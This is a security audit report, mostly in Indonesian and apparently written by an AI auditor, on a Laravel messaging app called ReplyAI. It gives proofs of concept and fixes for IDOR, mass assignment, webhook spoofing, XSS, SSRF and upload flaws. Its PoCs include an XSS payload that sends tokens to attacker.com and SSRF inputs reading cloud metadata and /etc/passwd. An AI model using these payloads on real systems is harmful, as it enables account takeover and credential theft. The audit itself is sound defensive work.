# 🔒 Security Audit Report - ReplyAI

> **Auditor**: Security Auditor AI  
> **Tanggal**: 16 Februari 2026  
> **Scope**: Full Application Audit  
> **Risk Level**: 🔴 HIGH - Multiple Critical Vulnerabilities Found

---

## 🎯 Executive Summary

Setelah melakukan audit menyeluruh pada codebase ReplyAI, ditemukan **16 vulnerability** dengan rincian:

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 CRITICAL | 7 | Immediate Action Required |
| 🟠 HIGH | 5 | Fix Within 1 Week |
| 🟡 MEDIUM | 3 | Fix Within 1 Month |
| 🟢 LOW | 1 | Best Practice |

**Rekomendasi Utama**:
1. Segera patch IDOR vulnerabilities (User A bisa akses data User B)
2. Implementasi webhook signature validation
3. Perbaiki Mass Assignment vulnerabilities
4. Sanitasi output untuk mencegah XSS

---

## 🔴 CRITICAL VULNERABILITIES

### [CRITICAL-001] IDOR - Unauthorized Takeover of Other User's Conversations

**Lokasi**: 
- `app/Http/Controllers/TakeoverController.php`
- `app/Http/Controllers/WhatsAppInboxController.php`

**Deskripsi**:
Controller tidak melakukan pengecekan kepemilikan (ownership) sebelum mengakses data. User yang terautentikasi bisa mengakses conversation milik user lain dengan menebak ID/phone number.

**Proof of Concept**:
```bash
# User A (attacker) bisa takeover conversation User B
POST /takeover/wa/628123456789/takeover
# Tanpa pengecekan apakah nomor 628123456789 milik User A

# User A bisa baca pesan User B
GET /whatsapp/api/messages/628987654321
```

**Impact**:
- Data leakage (baca pesan customer user lain)
- Business disruption (takeover conversation aktif user lain)
- Privilege escalation

**Fix**:
```php
// Di TakeoverController
try {
    $conversation = WaConversation::where('phone_number', $phone)
        ->where('user_id', auth()->id()) // ✅ TAMBAH INI
        ->firstOrFail();
} catch (ModelNotFoundException $e) {
    abort(403, 'Unauthorized');
}
```

---

### [CRITICAL-002] Mass Assignment - User ID Injection

**Lokasi**: 
- `app/Models/WaBroadcast.php`
- `app/Models/WaMessage.php`
- `app/Models/Conversation.php`
- `app/Models/WaConversation.php`

**Deskripsi**:
Field `user_id` ada di `$fillable`, memungkinkan attacker menginject `user_id` saat create/update. Ini bisa digunakan untuk:
- Membuat broadcast atas nama user lain
- Mengubah ownership conversation
- Pollute data analytics user lain

**Proof of Concept**:
```bash
POST /whatsapp/broadcast
Content-Type: application/json

{
  "title": "Spam Broadcast",
  "message": "Scam message",
  "user_id": 123,  // ✅ INJECT USER_ID ORANG LAIN!
  "target_type": "all_contacts"
}
```

**Fix**:
```php
// Model WaBroadcast
protected $fillable = [
    'title',
    'message',
    'media_path',
    'status',
    'scheduled_at',
    'filters'
    // ❌ HAPUS 'user_id' dari fillable
];

// Pastikan user_id di-set manual atau via trait BelongsToUser
```

---

### [CRITICAL-003] Webhook Spoofing - Instagram Webhook Tanpa Signature Validation

**Lokasi**: 
- `app/Http/Controllers/InstagramWebhookController.php`

**Deskripsi**:
Webhook handler menerima payload dari "Meta" tanpa memvalidasi signature. Attacker bisa spoofing webhook dan mengirim pesan palsu.

**Vulnerable Code**:
```php
public function handle(Request $request)
{
    $payload = $request->all(); // ❌ NO SIGNATURE CHECK!
    // Process message...
}
```

**Proof of Concept**:
```bash
# Attacker bisa kirim fake webhook
curl -X POST https://replyai.com/instagram/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "object": "instagram",
    "entry": [{
      "messaging": [{
        "sender": {"id": "fake_user"},
        "recipient": {"id": "target_ig_account"},
        "message": {"text": "Fake message", "mid": "fake_123"}
      }]
    }]
  }'
```

**Impact**:
- Fake message injection
- Data pollution
- Potential DoS (create banyak conversation palsu)

**Fix**:
```php
protected function verifySignature(Request $request): bool
{
    $signature = $request->header('X-Hub-Signature-256');
    $payload = $request->getContent();
    $secret = config('services.instagram.app_secret');
    
    $expected = 'sha256=' . hash_hmac('sha256', $payload, $secret);
    return hash_equals($expected, $signature);
}
```

---

### [CRITICAL-004] XSS - Stored XSS via Chat Messages

**Lokasi**: 
- `resources/views/pages/inbox/index.blade.php:523`

**Deskripsi**:
Output pesan chat menggunakan `{!! !!}` (unescaped) yang bisa mengeksekusi HTML/JavaScript.

**Vulnerable Code**:
```blade
<div class="message-content">
    {!! $content !!}  <!-- ❌ DANGEROUS! -->
</div>
```

**Proof of Concept**:
```javascript
// Attacker kirim pesan via Instagram:
"<img src=x onerror=alert(document.cookie)>"
"<script>fetch('https://attacker.com/steal?c='+localStorage.getItem('token'))</script>"
```

**Impact**:
- Session hijacking (steal cookies/localStorage)
- Account takeover
- Defacement

**Fix**:
```blade
<!-- Gunakan escaped output -->
<div class="message-content">
    {{ $content }}
</div>

<!-- Atau sanitasi dengan HTML Purifier jika perlu HTML -->
<div class="message-content">
    {!! clean($content) !!}
</div>
```

---

### [CRITICAL-005] SSRF - Server-Side Request Forgery via URL Import

**Lokasi**: 
- `app/Http/Controllers/KbArticleController.php:importUrl()`

**Deskripsi**:
Fungsi import URL bisa digunakan untuk fetch internal resources (localhost, internal IP, metadata endpoint).

**Vulnerable Code**:
```php
public function importUrl(Request $request)
{
    $url = $request->validate(['url' => 'required|url']);
    $res = Http::timeout(15)->get($url); // ❌ NO SSRF PROTECTION
    // ...
}
```

**Proof of Concept**:
```bash
POST /kb/import-url
{
  "url": "http://169.254.169.254/latest/meta-data/"  # AWS Metadata
}

POST /kb/import-url
{
  "url": "http://localhost:3306"  # MySQL Port
}

POST /kb/import-url
{
  "url": "file:///etc/passwd"  # Local File (jika wrapper enable)
}
```

**Impact**:
- Access internal services
- Cloud metadata theft
- Port scanning internal network

**Fix**:
```php
protected function isUrlSafe(string $url): bool
{
    $host = parse_url($url, PHP_URL_HOST);
    $ip = gethostbyname($host);
    
    // Block private IPs
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return false;
    }
    
    // Block localhost
    if ($host === 'localhost' || $host === '127.0.0.1') {
        return false;
    }
    
    return true;
}
```

---

### [CRITICAL-006] Authorization Bypass - Inbox Send to Any Conversation

**Lokasi**: 
- `app/Http/Controllers/InboxController.php:send()`

**Deskripsi**:
Method send() tidak memvalidasi apakah conversation yang dituju milik user yang sedang login.

**Vulnerable Code**:
```php
public function send(Request $request)
{
    $conversation = Conversation::findOrFail($conversationId); // ❌ NO AUTHORIZATION CHECK
    // Kirim pesan...
}
```

**Impact**:
- Send message to any conversation
- Impersonation attack
- Business disruption

**Fix**:
```php
$conversation = Conversation::where('id', $conversationId)
    ->where('user_id', auth()->id())
    ->firstOrFail();
```

---

### [CRITICAL-007] File Upload - Malicious File Execution

**Lokasi**: 
- `app/Http/Controllers/WhatsAppBroadcastController.php`
- `app/Http/Controllers/KbArticleController.php`

**Deskripsi**:
Validasi file upload hanya berdasarkan extension, tidak ada content-type validation atau virus scanning.

**Vulnerable Code**:
```php
$request->validate([
    'file' => 'nullable|file|max:10240|mimes:jpg,jpeg,png,pdf,mp4'
]);
// ❌ Hanya cek extension, bukan actual content
```

**Attack Scenario**:
1. Upload file PHP dengan extension .jpg
2. File stored di `storage/app/public/whatsapp-broadcast/`
3. Jika ada path traversal atau symlink, bisa dieksekusi

**Fix**:
```php
use Illuminate\Validation\Rules\File;

$request->validate([
    'file' => [
        'nullable',
        File::types(['jpg', 'jpeg', 'png', 'pdf', 'mp4'])
            ->min(1)
            ->max(10240),
    ]
]);

// Plus: Sanitize filename
$filename = Str::random(40) . '.' . $file->extension();
$path = $file->storeAs('whatsapp-broadcast', $filename, 'public');

// Plus: Scan with ClamAV (opsional)
```

---

## 🟠 HIGH VULNERABILITIES

### [HIGH-001] Rate Limiting - No Protection Against Brute Force

**Lokasi**: 
- Webhook endpoints
- API endpoints
- Login endpoints

**Deskripsi**:
Tidak ada rate limiting pada endpoint kritis, memungkinkan brute force dan DoS.

**Fix**:
```php
// routes/api.php
Route::middleware(['throttle:webhook'])->group(function () {
    Route::post('/instagram/webhook', ...);
    Route::post('/whatsapp/webhook/...', ...);
});

// di RouteServiceProvider
RateLimiter::for('webhook', function (Request $request) {
    return Limit::perMinute(60)->by($request->ip());
});
```

---

### [HIGH-002] Information Disclosure - Verbose Error Messages

**Lokasi**: 
- Multiple controllers

**Deskripsi**:
Error message yang terlalu verbose bisa membeberkan informasi sensitif.

**Contoh**:
```php
} catch (\Exception $e) {
    return response()->json([
        'error' => $e->getMessage(), // ❌ Bisa expose path, query, dll
        'trace' => $e->getTrace()    // ❌ BAHAYA!
    ]);
}
```

**Fix**:
```php
// Production: Log detail, return generic message
Log::error('Error', ['msg' => $e->getMessage(), 'trace' => $e->getTraceAsString()]);
return response()->json(['error' => 'Internal server error'], 500);
```

---

### [HIGH-003] Race Condition - Duplicate Data Creation

**Lokasi**: 
- `app/Http/Controllers/WhatsAppWebhookController.php`
- `app/Http/Controllers/InstagramWebhookController.php`

**Deskripsi**:
Penggunaan `firstOrCreate()` tanpa database locking bisa menyebabkan race condition.

**Vulnerable Code**:
```php
$conversation = WaConversation::firstOrCreate(
    ['phone_number' => $phone],
    ['display_name' => $name, 'status' => 'bot_active']
);
// ❌ Race condition jika 2 request bersamaan
```

**Fix**:
```php
use Illuminate\Support\Facades\DB;

DB::transaction(function () {
    $conversation = WaConversation::lockForUpdate()
        ->where('phone_number', $phone)
        ->first();
    
    if (!$conversation) {
        $conversation = WaConversation::create([...]);
    }
}, 5); // Retry 5x jika deadlock
```

---

### [HIGH-004] Weak Webhook Key

**Lokasi**: 
- `app/Http/Controllers/WhatsAppWebhookController.php`

**Deskripsi**:
Webhook key menggunakan simple string comparison dan default value yang predictable.

**Vulnerable Code**:
```php
protected function verifyWebhookKey(Request $request): bool
{
    $key = $request->header('X-WA-Service-Key');
    $expectedKey = config('services.whatsapp.webhook_key', 'replyai-wa-secret'); // ❌ DEFAULT WEAK!
    return $key === $expectedKey;
}
```

**Fix**:
```php
// Gunakan hash comparison
$expectedKey = config('services.whatsapp.webhook_key');
if (empty($expectedKey)) {
    return false;
}
return hash_equals($expectedKey, $key);

// Generate strong key: openssl rand -base64 32
```

---

### [HIGH-005] XSS via Component Icons

**Lokasi**: 
- `resources/views/components/ui/button.blade.php`
- `resources/views/components/ui/badge.blade.php`
- `resources/views/components/ui/alert.blade.php`

**Deskripsi**:
Icon SVG di-render menggunakan `{!! !!}` tanpa sanitasi.

**Fix**:
```blade
<!-- Sanitize atau gunakan allowed list -->
@php
$allowedIcons = [
    'check' => '<svg>...</svg>',
    'x' => '<svg>...</svg>',
];
@endphp

{!! $allowedIcons[$startIcon] ?? '' !!}
```

---

## 🟡 MEDIUM VULNERABILITIES

### [MEDIUM-001] Missing Input Validation - Phone Number Format

**Lokasi**: 
- Multiple WhatsApp controllers

**Deskripsi**:
Phone number tidak divalidasi dengan ketat, bisa menyebabkan injection.

**Fix**:
```php
$request->validate([
    'phone' => ['required', 'regex:/^[0-9]{10,15}$/']
]);
```

---

### [MEDIUM-002] Insecure Direct Object Reference - Broadcast Show

**Lokasi**: 
- `app/Http/Controllers/WhatsAppBroadcastController.php:show()`

**Deskripsi**:
Method show() tidak cek kepemilikan broadcast.

**Fix**:
```php
public function show(WaBroadcast $broadcast)
{
    if ($broadcast->user_id !== auth()->id()) {
        abort(403);
    }
    // ...
}
```

---

### [MEDIUM-003] Session Fixation Risk

**Lokasi**: 
- Authentication system

**Deskripsi**:
Tidak ada regenerasi session ID setelah login.

**Fix**:
```php
// Setelah autentikasi berhasil
session()->regenerate();
```

---

## 🟢 LOW VULNERABILITIES

### [LOW-001] Missing Security Headers

**Deskripsi**:
Beberapa security headers belum diimplementasi.

**Fix** (Tambah di middleware):
```php
$response->headers->set('X-Frame-Options', 'DENY');
$response->headers->set('X-Content-Type-Options', 'nosniff');
$response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
$response->headers->set('Content-Security-Policy', "default-src 'self'...");
```

---

## 📋 Remediation Priority

### Week 1 (Critical)
- [ ] Fix IDOR vulnerabilities (CRITICAL-001, 006)
- [ ] Fix Mass Assignment (CRITICAL-002)
- [ ] Fix XSS (CRITICAL-004)
- [ ] Implement Webhook Signature (CRITICAL-003)

### Week 2 (High)
- [ ] Fix SSRF (CRITICAL-005)
- [ ] Fix File Upload (CRITICAL-007)
- [ ] Implement Rate Limiting (HIGH-001)

### Week 3-4 (Medium/Low)
- [ ] Fix Race Conditions (HIGH-003)
- [ ] Improve Error Handling (HIGH-002)
- [ ] Add Security Headers (LOW-001)

---

## 🛡️ Security Best Practices Recommendation

1. **Enable Laravel's Built-in Security**:
   ```bash
   php artisan make:middleware SecurityHeaders
   ```

2. **Use Prepared Statements** (sudah mostly OK via Eloquent)

3. **Implement API Authentication**:
   - Gunakan Laravel Sanctum untuk API
   - Implement proper OAuth untuk webhook

4. **Regular Security Scan**:
   ```bash
   composer require --dev enlightn/security-checker
   php artisan security:check
   ```

5. **Enable Laravel Telescope (hanya dev)**:
   ```bash
   composer require laravel/telescope --dev
   ```

6. **Content Security Policy**:
   ```php
   // Tambah di middleware
   header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...");
   ```

---

## 🔍 Testing Checklist

Setelah fix, verifikasi dengan:

```bash
# 1. IDOR Test
curl -H "Authorization: Bearer USER_A_TOKEN" \
  https://api.replyai.com/whatsapp/api/messages/USER_B_PHONE
# Expected: 403 Forbidden

# 2. XSS Test
# Kirim pesan: <script>alert(1)</script>
# Expected: Script tidak dieksekusi (escaped output)

# 3. Webhook Spoofing
curl -X POST https://api.replyai.com/instagram/webhook \
  -d '{"fake":"payload"}'
# Expected: 401 Unauthorized (invalid signature)

# 4. Mass Assignment
curl -X POST https://api.replyai.com/whatsapp/broadcast \
  -H "Authorization: Bearer TOKEN" \
  -d '{"user_id": 999, "message": "test"}'
# Expected: user_id di-ignore, menggunakan auth()->id()

# 5. SSRF Test
curl -X POST https://api.replyai.com/kb/import-url \
  -d '{"url": "http://169.254.169.254/"}'
# Expected: 400 Bad Request (private IP blocked)
```

---

## 📞 Contact & Support

Jika ada pertanyaan tentang audit ini:
1. Review dokumen lengkap ini
2. Prioritaskan fix berdasarkan severity
3. Test di staging environment dulu

**Remember**: Security is a process, not a destination. Stay vigilant! 🛡️
